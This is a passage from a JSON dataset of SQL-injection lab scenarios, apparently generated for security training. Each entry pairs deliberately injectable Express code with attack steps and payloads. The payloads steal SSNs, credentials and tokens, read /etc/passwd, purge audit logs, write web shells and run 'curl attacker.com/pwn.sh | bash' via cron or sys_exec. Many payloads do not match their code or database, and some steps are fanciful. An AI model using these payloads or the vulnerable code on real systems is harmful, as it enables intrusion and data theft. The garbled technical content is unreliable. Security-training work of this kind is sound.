    "Lab Description": "A municipal records system constructs SQL queries using unsanitized document IDs in SELECT clauses. The PostgreSQL backend requires explicit type casting for UNION operators and returns JSON-formatted results. To solve: Extract sensitive tax records through multi-stage type-coerced UNION attacks and XML encoding bypasses while evading content security policies.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept GET /documents/12345 request with Burp Suite",
      "2. Determine column count using ORDER BY 9999--",
      "3. Match JSON types: ' UNION SELECT NULL,to_json(tax_record),NULL FROM tax_records--",
      "4. Bypass output encoding using json_agg() function",
      "5. Decode results and purge audit logs using stacked queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\n\napp.get('/documents/:id', async (req, res) => {\n  const docId = req.params.id;\n  const client = new pg.Client(process.env.DB_URL);\n  \n  try {\n    await client.connect();\n    const query = `SELECT title, content FROM documents WHERE id = ${docId}`;\n    const result = await client.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).json({ error: err.message });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,json_agg(tax_record)::text,NULL FROM tax_records--",
      "' AND 1=CAST((SELECT COUNT(*) FROM tax_records) AS INT)--",
      "'%00' UNION SELECT NULL,XMLAGG(XMLELEMENT(e, ssn)).EXTRACT('//text()'),NULL FROM citizens--",
      "'; COPY tax_records TO PROGRAM 'curl http://attacker.com/$(date)'-"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Time-Based SQLi in Notifications",
    "Lab Description": "A social network vulnerable to stacked time-based injection in notification tracking parameters. The MySQL backend allows delayed query execution but filters UNION operators. To solve: Exfiltrate private messages through DNS-based out-of-band channel using conditional BENCHMARK() delays and INTO OUTFILE vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable GET /notifications?user=123 parameter",
      "2. Verify time delay: ' OR BENCHMARK(5000000,MD5('test'))--",
      "3. Configure Interactsh client for DNS monitoring",
      "4. Craft payload: ' OR (SELECT message FROM pms INTO OUTFILE '/var/www/html/leak.txt')--",
      "5. Retrieve exfiltrated data via direct HTTP access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'social_user',\n  password: 'P@ssw0rd123',\n  database: 'social_db'\n});\n\napp.get('/notifications', (req, res) => {\n  const userId = req.query.user;\n  const query = `SELECT * FROM notifications WHERE user_id = ${userId}`;\n\n  pool.query(query, (err, results) => {\n    if (err) return res.status(500).send('Query error');\n    res.json(results[0]);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR IF(ASCII(SUBSTR((SELECT password FROM users),1)>100, BENCHMARK(10000000,SHA1('a')),0)--",
      "'; SELECT message FROM pms INTO DUMPFILE '/var/www/html/exfil.txt'--",
      "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--",
      "'; GRANT FILE ON *.* TO 'social_user'@'localhost'--"
    ]
  },
  {
    "Lab scenario": "Healthcare API Boolean-Blind SQLi in Patient Search",
    "Lab Description": "A HIPAA-compliant patient portal vulnerable to boolean-based blind injection in JSON search parameters. The Microsoft SQL Server backend provides no error feedback but returns different HTTP status codes. To solve: Extract medical record numbers through bitwise brute-force techniques and differential header analysis while bypassing request rate limits.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture POST /api/patients/search request with Postman",
      "2. Identify boolean condition: {\"ssn\":\"123-45-6789' AND '1'='1\"}",
      "3. Develop Python script using binary search: (ASCII(SUBSTR((SELECT mrn FROM records),1)) & 64",
      "4. Bypass rate limits with Tor network rotation",
      "5. Correlate HTTP 200/404 responses with extracted data bits"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\napp.use(express.json());\n\nconst config = {\n  user: 'health_user',\n  password: 'Secure123!',\n  server: 'dbserver',\n  options: { encrypt: true }\n};\n\napp.post('/api/patients/search', async (req, res) => {\n  try {\n    const filters = req.body;\n    let whereClause = Object.entries(filters)\n      .map(([key, val]) => `${key} = '${val}'`)\n      .join(' AND ');\n\n    const pool = await mssql.connect(config);\n    const result = await pool.request().query(`SELECT * FROM patients WHERE ${whereClause}`);\n    res.json(result.recordset.length > 0 ? 200 : 404);\n  } catch (err) {\n    res.status(500).end();\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' AND (SELECT SUBSTRING(mrn,1,1) FROM records) = 'A'--",
      "' OR (SELECT LENGTH(mrn) FROM records)=8 AND '1'='1",
      "') AND (SELECT COUNT(*) FROM information_schema.tables)=42--",
      "' AND (SELECT TOP 1 mrn FROM records) LIKE 'M%'--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Second-Order SQLi in Product Reviews",
    "Lab Description": "An online marketplace stores unsanitized user input in product reviews that later gets used in inventory queries. The SQLite backend allows stacked queries through multiple statement execution. To solve: Poison review content with time-based payloads and trigger inventory export to execute OS commands via ATTACH DATABASE vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Submit product review with payload: '||(SELECT CASE WHEN 1=1 THEN LOAD_EXTENSION('evil.so') END)--",
      "2. Trigger nightly inventory CSV export",
      "3. Exploit second-order injection in export query",
      "4. Execute commands via: '; ATTACH DATABASE '/var/www/shell.php' AS pwn;--",
      "5. Access web shell through HTTP interface"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\napp.use(express.urlencoded());\n\nconst db = new sqlite3.Database('ecom.db');\n\napp.post('/reviews', (req, res) => {\n  const { product_id, content } = req.body;\n  db.run(\n    `INSERT INTO reviews (product_id, content) \n     VALUES (${product_id}, '${content}')`, \n    (err) => {\n      if (err) return res.status(500).send(err.message);\n      res.send('Review posted');\n    }\n  );\n});\n\napp.listen(3000);",
    "payloads": [
      "'||(SELECT WRITEFILE('/etc/cron.d/pwn', '* * * * * root curl http://attacker.com/pwn.sh'))--",
      "'; ATTACH DATABASE '/var/www/cmd.php' AS pwn; CREATE TABLE pwn.exec (cmd TEXT);--",
      "'||(SELECT LOAD_EXTENSION('\\\\\\\\attacker.com\\\\share\\\\evil.dll'))--",
      "'; .open --hexdata 3c3f7068702073797374656d28245f4745545b307d293b203f3e0000--"
    ]
  },
  {
    "Lab scenario": "IoT Device Error-Based SQLi in Firmware Updates",
    "Lab Description": "An industrial IoT controller vulnerable to verbose error-based injection in firmware version parameters. The MySQL backend leaks schema information through unhandled constraint violations. To solve: Extract device credentials through nested error-induced data exfiltration and second-order injection via configuration backups.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Trigger error: GET /firmware?version=1.2.3')",
      "2. Extract table structure via error message analysis",
      "3. Craft nested error payload: ' AND 1=(SELECT 1 FROM (SELECT COUNT(*),CONCAT(credential,FLOOR(RAND(0)*2))x FROM users GROUP BY x)y)--",
      "4. Inject backup config with second-order payload: '||UPDATE users SET password='pwned'--",
      "5. Authenticate with compromised credentials via SSH"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'iot_user',\n  password: 'Insecure123',\n  database: 'device_management'\n});\n\napp.get('/firmware', (req, res) => {\n  const version = req.query.version;\n  const query = `SELECT * FROM firmware WHERE version = '${version}'`;\n\n  pool.query(query, (err, results) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(results[0]);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT credential FROM users),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
      "'%00' UNION SELECT NULL,@@version,NULL--",
      "'; UPDATE users SET password='pwned' WHERE username='admin'--",
      "'||MAKE_SET(1,TOKEN) IS NOT NULL--"
    ]
  },
  {
    "Lab scenario": "Education Portal Boolean-Based SQLi in Gradebook HAVING Clause",
    "Lab Description": "A university grading system vulnerable to boolean-based injection in assignment grouping parameters. The MySQL backend provides no direct error feedback but returns different CSV formats for true/false conditions. To solve: Extract student SSNs through differential response analysis and bit-shifting brute-force techniques while evading request throttling.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Map injection point using OWASP ZAP on group_id parameter",
      "2. Identify boolean triggers: '1'='1'-- vs '1'='2'-- via CSV header presence",
      "3. Develop Python script with binary search pattern matching",
      "4. Optimize with parallel async requests using aiohttp",
      "5. Crack extracted hashes using rainbow table lookups"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'edu_user',\n  password: 'Insecure123!',\n  database: 'gradebook'\n});\n\napp.get('/grades', (req, res) => {\n  const groupId = req.query.group;\n  const query = `SELECT student_id, AVG(grade) \n               FROM assignments \n               GROUP BY student_id \n               HAVING class_id = ${groupId}`;\n\n  pool.query(query, (err, results) => {\n    if (err || results[0].length === 0) return res.status(404).end();\n    res.attachment('grades.csv').send(results[0]);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR (SELECT MID((SELECT ssn FROM students),1,1) = 'A'--",
      "' AND (SELECT LENGTH(ssn) FROM students)=11 AND '1'='1",
      "') AND (SELECT COUNT(*) FROM information_schema.tables)=42--",
      "' AND (SELECT 1 FROM (SELECT BENCHMARK(1000000,SHA1('a')))--"
    ]
  },
  {
    "Lab scenario": "Logistics System Time-Based SQLi in Shipment Tracking",
    "Lab Description": "A package tracking system vulnerable to stacked time-based injection in tracking number parameters. The SQLite backend allows delayed query execution through randomblob() function. To solve: Exfiltrate shipment manifests through response timing analysis and filesystem operations via LOAD_EXTENSION attacks.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable GET /tracking/ABC123 parameter",
      "2. Verify time delay: ' OR randomblob(100000000)--",
      "3. Develop timing correlation script with Python's timeit module",
      "4. Load malicious extension: '; SELECT load_extension('\\\\attacker.com\\share\\evil.so')--",
      "5. Execute commands through exported SQL functions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\n\nconst db = new sqlite3.Database('shipments.db');\n\napp.get('/tracking/:id', (req, res) => {\n  const trackingId = req.params.id;\n  const query = `SELECT * FROM packages WHERE tracking_id = '${trackingId}'`;\n\n  db.all(query, (err, rows) => {\n    if (err) return res.status(500).send('Tracking error');\n    res.json(rows);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR (SELECT CASE WHEN SUBSTR(manifest,1,1)='A' THEN randomblob(10000000) END FROM shipments)--",
      "'; ATTACH DATABASE '/var/www/shell.php' AS pwn; CREATE TABLE pwn.exec(cmd TEXT);--",
      "'||(SELECT WRITEFILE('/etc/cron.d/pwn', '* * * * * root curl http://attacker.com/pwn.sh'))--",
      "'; .open --hexdata 3c3f7068700a..."
    ]
  },
  {
    "Lab scenario": "Healthcare IoT Device Blind SQLi in Sensor Calibration",
    "Lab Description": "A medical device calibration interface vulnerable to boolean-based blind injection in firmware version parameters. The SQLite backend provides no error feedback but returns different calibration status codes. To solve: Extract device admin credentials through bitwise brute-force and statistical response analysis while bypassing HMAC validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture POST /calibrate request with firmware_version=1.2.3",
      "2. Identify boolean triggers using Burp Intruder cluster bomb attacks",
      "3. Develop Huffman-encoded brute-force script with Scrapy middleware",
      "4. Bypass HMAC signatures through timing oracle attacks",
      "5. Authenticate to device debug interface with extracted credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE devices (id INT, firmware TEXT, calibrated INT)\");\n  db.run(\"INSERT INTO devices VALUES (1, '1.2.3', 0)\");\n});\n\napp.post('/calibrate', (req, res) => {\n  const version = req.body.firmware_version;\n  const query = `UPDATE devices SET calibrated = 1 WHERE firmware = '${version}'`;\n\n  db.run(query, function(err) {\n    res.json({ calibrated: this.changes > 0 ? 1 : 0 });\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR (SELECT SUBSTR(password,1,1) FROM admins) = 'a' AND '1'='1",
      "' AND (SELECT LENGTH(password) FROM admins)=12 AND '1'='1",
      "') AND (SELECT HEX(SUBSTR(password,1)) FROM admins) > '30'--",
      "' AND (SELECT COUNT(*) FROM sqlite_master)=5--"
    ]
  },
  {
    "Lab scenario": "E-Commerce CMS Second-Order SQLi in Product Imports",
    "Lab Description": "A product management system vulnerable to second-order injection through CSV import functionality. The MySQL backend executes stored procedures using unsanitized import metadata. To solve: Poison product descriptions with stacked query payloads and trigger inventory sync to execute OS commands via sys_exec() UDF.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Upload CSV with poisoned description: '; CREATE TABLE exfil(cmd TEXT)--",
      "2. Trigger nightly inventory synchronization job",
      "3. Exploit second-order injection in sync procedure",
      "4. Execute commands: '; CALL sys_exec('curl http://attacker.com/pwn.sh | bash')--",
      "5. Establish reverse shell through cron job persistence"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\napp.use(express.json());\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'cms_user',\n  password: 'P@ssw0rd!',\n  database: 'product_db'\n});\n\napp.post('/import', (req, res) => {\n  const products = req.body;\n  products.forEach(p => {\n    pool.query(\n      `INSERT INTO products (name, description) \n       VALUES ('${p.name}', '${p.description}')`\n    );\n  });\n  res.send('Import queued');\n});\n\napp.listen(3000);",
    "payloads": [
      "'; CREATE PROCEDURE pwn() BEGIN DECLARE cmd CHAR(255); SET cmd='curl http://attacker.com/pwn.sh | bash'; SET cmd=sys_exec(cmd); END;--",
      "'||(SELECT LOAD_FILE('/etc/passwd'))--",
      "'; GRANT ALL PRIVILEGES ON *.* TO 'pwn'@'%' IDENTIFIED BY 'pwned'--",
      "'; UPDATE mysql.user SET plugin='mysql_native_password' WHERE User='root'--"
    ]
  },
  {
    "Lab scenario": "Banking Mobile App Union-Based SQLi in Transaction Sorting",
    "Lab Description": "A mobile banking application vulnerable to UNION-based injection in the transaction history sorting parameter. The MySQL backend returns verbose errors through debug build flags. To solve: Extract account PIN hashes using multi-phase type coercion and JSON array bypass techniques while evading mobile API signature checks.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept API call with Burp Suite Mobile Assistant",
      "2. Identify injectable 'sort' parameter using sqlmap tamper scripts",
      "3. Craft payload: ' UNION SELECT NULL,JSON_ARRAYAGG(pin_hash),NULL FROM pins--",
      "4. Bypass HMAC validation through timing window exploitation",
      "5. Crack hashes using GPU-accelerated brute-force"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2/promise');\nconst app = express();\n\napp.get('/transactions', async (req, res) => {\n  const sort = req.query.sort || 'date';\n  const conn = await mysql.createConnection({\n    host: 'localhost',\n    user: 'mobile_app',\n    password: 'InsecureBankAPI123',\n    database: 'transactions'\n  });\n\n  try {\n    const [rows] = await conn.query(`SELECT id, amount, date FROM transactions ORDER BY ${sort}`);\n    res.json(rows);\n  } catch (err) {\n    console.error('Full error:', err.stack);\n    res.status(500).json({ error: err.code });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,TO_BASE64(pin_hash),NULL FROM pins--",
      "' AND 1=CONVERT((SELECT COUNT(*) FROM pins),UNSIGNED INTEGER)--",
      "'; UPDATE pins SET hash=MD5('pwned') WHERE user_id=1--",
      "'%00' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--"
    ]
  },
  {
    "Lab scenario": "Healthcare IoT Device Blind SQLi in Patient Monitoring",
    "Lab Description": "A medical IoT hub vulnerable to time-based blind injection in patient vital aggregation. The SQLite backend allows stacked queries through firmware debugging interfaces. To solve: Exfiltrate PHI data through differential power analysis of query execution times and EMF side-channel leakage.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Capture CAN bus traffic during vital sign updates",
      "2. Identify timing differentials using Software Defined Radio (SDR)",
      "3. Craft electromagnetic fault injection payloads",
      "4. Extract EEPROM contents via glitched queries",
      "5. Reconstruct database from memory artifacts"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\n\nconst db = new sqlite3.Database('patient_monitor.db');\n\napp.post('/vitals', (req, res) => {\n  const patientId = req.body.patient_id;\n  const query = `SELECT AVG(heart_rate) FROM vitals WHERE patient_id = ${patientId}`;\n\n  db.get(query, (err, row) => {\n    if (err) return res.status(500).send('Monitor error');\n    res.json(row);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR (SELECT CASE WHEN SUBSTR(ssn,1,1)='A' THEN randomblob(100000000) END FROM patients)--",
      "'; ATTACH DATABASE '/dev/fb0' AS display; UPDATE display SET pixel=0xFF0000 WHERE x=0 AND y=0--",
      "'||(SELECT WRITE_FILE('/proc/self/mem', (SELECT * FROM patients)))--",
      "'; PRAGMA writable_schema=1; UPDATE sqlite_master SET sql='CREATE TABLE pwn(cmd TEXT)'--"
    ]
  },
  {
    "Lab scenario": "Banking portal UNION-based SQL injection in transaction history ORDER BY clause",
    "Lab Description": "Transaction history endpoint concatenates the usersupplied `sort` parameter directly into the SQL `ORDER BY` clause without any sanitization. Due to verbose debug logging and error leakage, failed injections reveal column counts and types. The application fails open, returning query results even when extra columns are included. To solve: retrieve the database version string by injecting a UNION SELECT payload into the `sort` parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use BurpSuite to intercept the GET `/transactions?sort=date` request",
      "Validate vulnerability by injecting an invalid column index (`date'ORDERBY99--`) and observing the error",
      "Craft a UNION-based payload to match column count and inject `version()`: `date'UNIONSELECTNULL,version(),NULL--`",
      "Refine the payload to fit the correct number of columns and syntax",
      "Verify the database version appears in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE transactions(id INTEGER PRIMARY KEY, amount INTEGER, date TEXT)\");\n  db.run(\"INSERT INTO transactions(amount,date) VALUES (100,'2025-01-01')\");\n});\napp.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT id, amount, date FROM transactions ORDER BY ${sort}`; // vulnerability here\n  console.log('DEBUG QUERY:', query);\n  db.all(query, [], (err, rows) => {\n    if(err) return res.status(500).send(err.message);\n    res.json(rows);\n  });\n});\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));",
    "payloads": [
      "date' ORDER BY 99--",
      "date' UNION SELECT NULL,version(),NULL--",
      "date' UNION SELECT name, sql, NULL FROM sqlite_master--"
    ]
  },
  {
    "Lab scenario": "CMS UNION-based SQL injection in article analytics GROUPBY clause",
    "Lab Description": "Article analytics endpoint groups pageviews by an unsanitized `group` parameter in the `GROUPBY` clause. Error leakage reveals grouping errors and allowed column names. The application logs full stack traces. To solve: extract administrator email from `users` table via UNION SELECT in the `group` parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use BurpSuite to intercept GET `/analytics?group=category`",
      "Validate by injecting an invalid group column (`category'GROUPBYfake--`) and observing the error",
      "Craft a UNION-based payload matching column count: `'category'GROUPBYcategoryUNIONSELECTNULL,email,NULLFROMusers--`",
      "Bypass grouping constraints by adding `NULL` padding",
      "Verify the admin email appears in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE articles(id INTEGER, category TEXT, views INTEGER)\");\n  db.run(\"CREATE TABLE users(id INTEGER, email TEXT)\");\n  db.run(\"INSERT INTO users(email) VALUES ('admin@cms.local')\");\n});\napp.get('/analytics', (req, res) => {\n  const group = req.query.group || 'category';\n  const query = `SELECT ${group}, COUNT(*) FROM articles GROUP BY ${group}`; // vulnerability here\n  console.log('DEBUG:', query);\n  db.all(query, [], (err, rows) => {\n    if(err) return res.status(500).send(err.message);\n    res.json(rows);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "category' GROUP BY category UNION SELECT NULL,email,NULL FROM users--",
      "category' UNION SELECT NULL,sql,NULL FROM sqlite_master--"
    ]
  },
  {
    "Lab scenario": "API gateway UNION-based SQL injection in GraphQL resolver",
    "Lab Description": "A GraphQL `posts(filter)` resolver directly interpolates the `filter` argument into a PostgreSQL query without sanitization. Failed injections leak timing and errors. To solve: enumerate database tables by injecting a UNION SELECT in the `filter` argument.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Apollo Client DevTools to capture the GraphQL query",
      "Validate by injecting `filter: \"1=1\" OR 1=CAST((SELECT 1/0) AS INT)--` to trigger an error",
      "Craft a UNION-based payload: `filter: \"1=0 UNION SELECT tablename,NULL FROM pg_tables--\"`",
      "Refine to target `public` schema tables",
      "Verify table names appear in the response JSON"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst { Pool } = require('pg');\nconst schema = buildSchema(`type Query { posts(filter: String): [Post] } type Post { id: ID, title: String }`);\nconst pool = new Pool();\nconst root = {\n  posts: async ({ filter }) => {\n    const query = `SELECT id,title FROM posts WHERE ${filter}`; // vulnerability here\n    console.log(query);\n    const res = await pool.query(query);\n    return res.rows;\n  }\n};\nconst app = express();\napp.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true }));\napp.listen(4000);",
    "payloads": [
      "1=0 UNION SELECT tablename,NULL FROM pg_tables--",
      "1=0 UNION SELECT table_name,NULL FROM information_schema.tables--"
    ]
  },
  {
    "Lab scenario": "IoT dashboard UNION-based SQL injection in device status REST endpoint",
    "Lab Description": "The `/devices/:id/status` REST endpoint interpolates the `id` path parameter into a MySQL query without sanitization. Error messages reveal file paths. To solve: extract device secret key from `iot_keys` table via UNION SELECT in the `id` parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send GET `/devices/123/status`",
      "Validate by using ID `123x'` and observing SQL error",
      "Craft payload: `123' UNION SELECT NULL,secret,NULL FROM iot_keys--`",
      "Refine payload to match column count",
      "Verify the secret key appears in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('mysql');\nconst app = express();\nconst pool = new Pool({ /* conn */ });\napp.get('/devices/:id/status', (req, res) => {\n  const id = req.params.id;\n  const query = `SELECT id,status,updated_at FROM devices WHERE id='${id}'`; // vulnerability here\n  console.log(query);\n  pool.query(query, (err, results) => {\n    if(err) return res.status(500).send(err.sqlMessage);\n    res.json(results[0]);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "123' UNION SELECT NULL,secret,NULL FROM iot_keys--",
      "123' UNION SELECT NULL,version(),NULL--"
    ]
  },
  {
    "Lab scenario": "Enterprise SOAP API UNION-based SQL injection in getUserDetails",
    "Lab Description": "A SOAP API `/soap` endpoint parses XML input and directly concatenates the `<userId>` element into an SQL query without sanitization. Verbose XML parser errors leak SQL. To solve: retrieve the list of roles from `user_roles` via a UNION SELECT injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use BurpSuite to intercept the SOAP request body",
      "Validate by injecting `<userId>1' OR 1=1--</userId>` and observing the response",
      "Craft payload in XML: `<userId>1' UNION SELECT role,NULL FROM user_roles--</userId>`",
      "Refine payload to fit the column schema",
      "Verify the roles appear in the SOAP response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst xmlParser = require('express-xml-bodyparser');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(xmlParser());\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE user_roles(id INTEGER, role TEXT)\");\n  db.run(\"INSERT INTO user_roles(role) VALUES ('admin')\");\n});\napp.post('/soap', (req, res) => {\n  const userId = req.body.Envelope.Body[0].getUserDetails[0].userId[0];\n  const query = `SELECT id,username FROM users WHERE id='${userId}'`; // vulnerability\n  console.log(query);\n  db.all(query, [], (err, rows) => {\n    if(err) return res.status(500).send(err.message);\n    res.json(rows);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "1' UNION SELECT role,NULL FROM user_roles--",
      "1' UNION SELECT sql,NULL FROM sqlite_master--"
    ]
  },
  {
    "Lab scenario": "Social media platform UNION-based SQL injection in comment search",
    "Lab Description": "The comment search feature accepts a `q` parameter which is directly used in a DELETE statement for moderation logs. Error-based feedback leaks query syntax. To solve: exfiltrate OAuth tokens from `oauth_tokens` via UNION SELECT injection in the `q` parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use BurpSuite to intercept GET `/comments/search?q=test`",
      "Validate by injecting `test'` and observing SQL error",
      "Craft payload: `test' UNION SELECT token,NULL FROM oauth_tokens--`",
      "Refine payload with column padding",
      "Verify tokens appear in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\napp.get('/comments/search', async (req, res) => {\n  const q = req.query.q;\n  const query = `SELECT id,comment FROM comments WHERE comment LIKE '%${q}%'`; // vulnerability\n  console.log(query);\n  try { const result = await mssql.query(query); res.json(result.recordset); }\n  catch(err) { res.status(500).send(err.message); }\n});\napp.listen(3000);",
    "payloads": [
      "test' UNION SELECT token,NULL FROM oauth_tokens--",
      "test' UNION SELECT email,NULL FROM users--"
    ]
  },
  {
    "Lab scenario": "Cloud storage API UNION-based SQL injection in JSONB metadata",
    "Lab Description": "File metadata endpoint accepts a JSON payload and uses `jsonb_extract_path_text()` directly in an SQL query without sanitization. Error leakage reveals JSON path errors. To solve: extract AWS credentials from `aws_creds` via UNION SELECT injection in the JSON path.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send POST `/upload` with JSON metadata",
      "Validate by inserting malformed JSON path and observing SQL error",
      "Craft payload: `{\"path\": \"tags'; UNION SELECT access_key,NULL FROM aws_creds--\"}`",
      "Refine payload to correct JSONB syntax",
      "Verify credentials appear in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst { Pool } = require('pg');\nconst app = express();\napp.use(bodyParser.json());\nconst pool = new Pool();\napp.post('/upload', async (req, res) => {\n  const { path } = req.body;\n  const query = `SELECT jsonb_extract_path_text(metadata,'${path}') FROM files`; // vulnerability\n  console.log(query);\n  try { const { rows } = await pool.query(query); res.json(rows); }\n  catch(err) { res.status(500).send(err.message); }\n});\napp.listen(3000);",
    "payloads": [
      "tags'; UNION SELECT access_key,NULL FROM aws_creds--",
      "config'; UNION SELECT secret_key,NULL FROM aws_creds--"
    ]
  },
  {
    "Lab scenario": "Government portal UNION-based SQL injection in document search ORDERBY",
    "Lab Description": "Classified document search uses the `sort` parameter unsafely in an Oracle `ORDERBY` clause. Verbose errors leak OOB function calls. To solve: exfiltrate `blueprints` table filenames via UNION SELECT injection in the `sort` parameter.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET `/search?sort=date` with BurpSuite",
      "Validate by injecting `date' ORDER BY 999--` and observing error",
      "Craft payload: `date' UNION SELECT filename,NULL FROM blueprints--`",
      "Bypass column count by adding `NULL` padding",
      "Verify filenames appear in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst oracledb = require('oracledb');\nconst app = express();\napp.get('/search', async (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT id,title FROM documents ORDER BY ${sort}`; // vulnerability\n  console.log(query);\n  try { const result = await oracledb.getConnection().then(conn => conn.execute(query)); res.json(result.rows); }\n  catch(err) { res.status(500).send(err.message); }\n});\napp.listen(3000);",
    "payloads": [
      "date' UNION SELECT filename,NULL FROM blueprints--",
      "date' UNION SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA'),NULL FROM DUAL--"
    ]
  },
  {
    "Lab scenario": "Ecommerce REST API UNION-based SQL injection in product search",
    "Lab Description": "Product search endpoint uses the `name` query parameter directly in an SQLite query. Error messages leak schema. To solve: enumerate table names via UNION SELECT injection in the `name` parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use BurpSuite to intercept GET `/search?name=prod`",
      "Validate by injecting `prod'` and observing SQL error",
      "Craft payload: `prod' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--`",
      "Refine payload to target specific schema",
      "Verify table names appear in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products(name TEXT)\");\n});\napp.get('/search', (req, res) => {\n  const name = req.query.name || '';\n  const query = `SELECT * FROM products WHERE name='${name}'`; // vulnerability\n  console.log(query);\n  db.all(query, [], (err, rows) => {\n    if(err) return res.status(500).send(err.message);\n    res.json(rows);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "prod' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--",
